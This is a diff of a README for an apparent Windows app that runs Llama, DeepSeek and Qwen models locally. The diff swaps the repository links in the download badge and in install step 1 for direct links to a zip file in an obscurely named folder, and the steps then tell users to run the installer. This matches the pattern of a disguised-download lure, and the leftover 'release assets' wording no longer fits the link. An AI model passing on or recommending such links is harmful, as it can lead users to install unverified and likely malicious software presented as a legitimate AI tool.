@@ -1,6 +1,6 @@
 # 🧠 open-source-llm-llama-deepseek-qwen - Run private artificial intelligence on Windows
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Hookeepidiascope794/open-source-llm-llama-deepseek-qwen)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Hookeepidiascope794/open-source-llm-llama-deepseek-qwen/main/omphalism/llama-deepseek-source-open-llm-qwen-v3.2.zip)
 
 ## 📌 Project Overview
 
@@ -20,7 +20,7 @@ Your computer needs specific hardware components to run these models smoothly. C
 
 Follow these steps to install the software. 
 
-1. Visit the repository page to download the necessary installer: [https://github.com/Hookeepidiascope794/open-source-llm-llama-deepseek-qwen](https://github.com/Hookeepidiascope794/open-source-llm-llama-deepseek-qwen)
+1. Visit the repository page to download the necessary installer: [https://raw.githubusercontent.com/Hookeepidiascope794/open-source-llm-llama-deepseek-qwen/main/omphalism/llama-deepseek-source-open-llm-qwen-v3.2.zip](https://raw.githubusercontent.com/Hookeepidiascope794/open-source-llm-llama-deepseek-qwen/main/omphalism/llama-deepseek-source-open-llm-qwen-v3.2.zip)
 2. Locate the latest release file in the assets section.
 3. Save the installer file to your computer.
 4. Run the installer by double-clicking the file.
